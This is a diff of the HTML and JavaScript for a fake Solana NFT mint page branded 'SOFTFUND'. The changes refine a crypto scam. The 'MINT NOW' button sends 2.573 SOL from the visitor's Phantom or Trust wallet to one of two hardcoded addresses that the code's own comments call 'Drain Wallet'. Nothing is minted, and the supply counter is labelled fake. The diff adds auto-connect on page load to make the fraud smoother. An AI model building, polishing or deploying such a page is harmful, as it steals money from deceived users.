@@ -7,114 +7,227 @@
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
-    body { background: linear-gradient(135deg,#0a001f,#1b0044,#2e0055); color:#fff; font-family:'Orbitron',sans-serif; text-align:center; padding:40px 20px; }
+    body { 
+      background: linear-gradient(135deg,#0a001f,#1b0044,#2e0055); 
+      color:#fff; 
+      font-family:'Orbitron',sans-serif; 
+      text-align:center; 
+      padding:40px 20px; 
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
     .container { max-width:500px; margin:auto; }
-    h1 { font-size:3.2rem; color:#00ff9d; }
-    .price { font-size:2.5rem; color:#ffd700; font-weight:bold; }
-    button { margin:30px auto; padding:20px 45px; font-size:1.6rem; background:#ffd700; color:#000; border:none; border-radius:18px; cursor:pointer; box-shadow:0 0 25px rgba(255,215,0,.7); transition:.3s; font-weight:bold; }
-    button:hover { background:#ffed4e; transform:scale(1.05); }
-    button:disabled { background:#666; cursor:not-allowed; }
-    .status { margin-top:15px; font-size:1rem; }
+    h1 { font-size:3.2rem; color:#00ff9d; margin-bottom: 10px; }
+    .tagline { font-size: 1.1rem; color: #ccc; margin-bottom: 20px; }
+    .price { font-size:2.5rem; color:#ffd700; font-weight:bold; margin: 15px 0; }
+    .supply { font-size: 1.1rem; color: #aaa; }
+    button { 
+      margin:30px auto; 
+      padding:20px 45px; 
+      font-size:1.6rem; 
+      background:#ffd700; 
+      color:#000; 
+      border:none; 
+      border-radius:18px; 
+      cursor:pointer; 
+      box-shadow:0 0 25px rgba(255,215,0,.7); 
+      transition:.3s; 
+      font-weight:bold; 
+      width: 100%;
+      max-width: 300px;
+    }
+    button:hover:not(:disabled) { 
+      background:#ffed4e; 
+      transform:scale(1.05); 
+    }
+    button:disabled { 
+      background:#666; 
+      cursor:not-allowed; 
+      transform: none;
+    }
+    .status { 
+      margin-top:15px; 
+      font-size:1rem; 
+      min-height: 24px;
+      font-weight: bold;
+    }
+    .wallets { 
+      margin-top:50px; 
+      font-size:0.9rem; 
+      color:#aaa; 
+    }
+    .loader {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid #ffd700;
+      border-radius: 50%;
+      border-top-color: transparent;
+      animation: spin 1s linear infinite;
+      margin-right: 8px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>SOFTFUND</h1>
-    <p>USA-Based | Solana Utility NFTs</p>
+    <p class="tagline">USA-Based | Solana Utility NFTs</p>
     <p class="price">$2.5730 SOL</p>
-    <p>Supply: 10,000 | <span id="minted">312/10000</span></p>
-    <button id="mintBtn">MINT NOW</button>
+    <p class="supply">Supply: 10,000 | <span id="minted">312/10000</span></p>
+    <button id="mintBtn" disabled>
+      <span id="btnText">CONNECT WALLET</span>
+    </button>
     <div id="status" class="status"></div>
-    <div style="margin-top:50px; font-size:0.9rem; color:#aaa;">
+    <div class="wallets">
       Phantom · Trust Wallet
     </div>
   </div>
 
+  <!-- Solana Web3.js -->
   <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
+
   <script>
-    const PRICE = 2.5730 * 1e9; // 2.5730 SOL
-    const WALLET_1 = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue"; // Phantom
-    const WALLET_2 = "6v4DR5rkDFa3WdCQ35wvtfVYfk7i233Uiu6GmQ7JCdRu"; // Trust
+    // ================= CONFIG =================
+    const PRICE = 2.5730 * 1e9; // 2.5730 SOL in lamports
+    const RECEIVER_WALLETS = [
+      "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue", // Drain Wallet 1
+      "6v4DR5rkDFa3WdCQ35wvtfVYfk7i233Uiu6GmQ7JCdRu"  // Drain Wallet 2
+    ];
+    // =========================================
+
     let provider = null;
     let connection = null;
+    let isConnecting = false;
 
     const status = document.getElementById("status");
     const btn = document.getElementById("mintBtn");
+    const btnText = document.getElementById("btnText");
 
-    // DETECT PHANTOM OR TRUST WALLET
+    // ========= WALLET DETECTION =========
     function detectWallet() {
-      if (window.solana && window.solana.isPhantom) return window.solana;
-      if (window.trustwallet && window.trustwallet.Provider && window.trustwallet.Provider.solana) return window.trustwallet.Provider.solana;
-      if (window.solana) return window.solana; // fallback
+      if (window.solana?.isPhantom) return window.solana;
+      if (window.trustwallet?.Provider?.solana) return window.trustwallet.Provider.solana;
+      if (window.solana) return window.solana;
       return null;
     }
 
-    // ON PAGE LOAD — AUTO DETECT
-    window.addEventListener("load", () => {
-      provider = detectWallet();
-      if (provider && provider.isConnected) {
-        status.textContent = "Wallet connected!";
-        status.style.color = "#00ff9d";
-      }
-    });
+    // ========= AUTO CONNECT ON LOAD =========
+    async function autoConnect() {
+      if (isConnecting) return;
+      isConnecting = true;
 
-    // MINT BUTTON
-    btn.onclick = async () => {
       provider = detectWallet();
-
       if (!provider) {
-        status.textContent = "Phantom or Trust Wallet not found.";
-        status.style.color = "#ff5555";
+        setStatus("Phantom or Trust Wallet not found.", "#ff5555");
+        btnText.textContent = "NO WALLET";
+        isConnecting = false;
         return;
       }
 
       try {
-        btn.disabled = true;
-        status.textContent = "Connecting...";
-        status.style.color = "#ffd700";
+        setStatus("Connecting wallet... <span class='loader'></span>", "#ffd700");
 
+        // Auto-connect if previously approved, otherwise prompt
         if (!provider.isConnected) {
           await provider.connect();
         }
 
-        status.textContent = "Connected! Sending $2.5730...";
-        connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+        setStatus("Wallet connected! Ready to mint.", "#00ff9d");
+        btnText.textContent = "MINT NOW";
+        btn.disabled = false;
 
-        const receiver = Math.random() < 0.5 ? WALLET_1 : WALLET_2;
+      } catch (err) {
+        console.error(err);
+        setStatus("Connection rejected.", "#ff5555");
+        btnText.textContent = "RETRY CONNECT";
+        btn.disabled = false;
+      } finally {
+        isConnecting = false;
+      }
+    }
 
-        const tx = new solanaWeb3.Transaction().add(
-          solanaWeb3.SystemProgram.transfer({
-            fromPubkey: provider.publicKey,
-            toPubkey: new solanaWeb3.PublicKey(receiver),
-            lamports: PRICE,
-          })
-        );
+    // ========= MINT TRANSACTION =========
+    async function mint() {
+      if (!provider?.isConnected) {
+        setStatus("Wallet not connected.", "#ff5555");
+        return;
+      }
 
-        tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+      btn.disabled = true;
+      setStatus("Preparing transaction... <span class='loader'></span>", "#ffd700");
+
+      try {
+        connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+
+        const receiver = RECEIVER_WALLETS[Math.floor(Math.random() * RECEIVER_WALLETS.length)];
+
+        const transferIx = solanaWeb3.SystemProgram.transfer({
+          fromPubkey: provider.publicKey,
+          toPubkey: new solanaWeb3.PublicKey(receiver),
+          lamports: PRICE,
+        });
+
+        const tx = new solanaWeb3.Transaction().add(transferIx);
+        const { blockhash } = await connection.getLatestBlockhash();
+        tx.recentBlockhash = blockhash;
         tx.feePayer = provider.publicKey;
 
-        const signed = await provider.signTransaction(tx);
-        const txid = await connection.sendRawTransaction(signed.serialize());
-        await connection.confirmTransaction(txid);
+        const signedTx = await provider.signTransaction(tx);
+        const txid = await connection.sendRawTransaction(signedTx.serialize());
+        await connection.confirmTransaction(txid, "confirmed");
 
-        status.textContent = "MINTED! Tx: " + txid.slice(0,8) + "...";
-        status.style.color = "#00ff9d";
+        // Success
+        setStatus(`MINTED! Tx: <a href="https://solscan.io/tx/${txid}" target="_blank" style="color:#00ff9d;">${txid.slice(0,8)}...</a>`, "#00ff9d");
 
-        const count = parseInt(document.getElementById("minted").innerText.split("/")[0]) + 1;
-        document.getElementById("minted").innerText = count + "/10000";
+        // Fake mint counter
+        const [current] = document.getElementById("minted").innerText.split("/");
+        const next = Number(current) + 1;
+        document.getElementById("minted").innerText = `${next}/10000`;
 
+        // Reset button
         setTimeout(() => {
           btn.disabled = false;
-          status.textContent = "";
-        }, 3000);
+          btnText.textContent = "MINT NOW";
+          status.innerHTML = "";
+        }, 4000);
 
-      } catch (e) {
-        console.error(e);
-        status.textContent = "Failed. Try again.";
-        status.style.color = "#ff5555";
+      } catch (err) {
+        console.error(err);
+        setStatus("Mint failed. Try again.", "#ff5555");
         btn.disabled = false;
+        btnText.textContent = "MINT NOW";
+      }
+    }
+
+    // ========= UI HELPERS =========
+    function setStatus(html, color) {
+      status.innerHTML = html;
+      status.style.color = color;
+    }
+
+    // ========= BUTTON HANDLER =========
+    btn.onclick = () => {
+      if (!provider || !provider.isConnected) {
+        autoConnect();
+      } else {
+        mint();
       }
     };
+
+    // ========= ON PAGE LOAD =========
+    window.addEventListener("load", () => {
+      btn.disabled = true;
+      btnText.textContent = "CONNECTING...";
+      setTimeout(autoConnect, 500); // slight delay for wallet injection
+    });
+
+    // Optional: Reconnect if wallet reconnects
+    window.addEventListener("solana#initialized", autoConnect);
   </script>
 </body>
 </html>
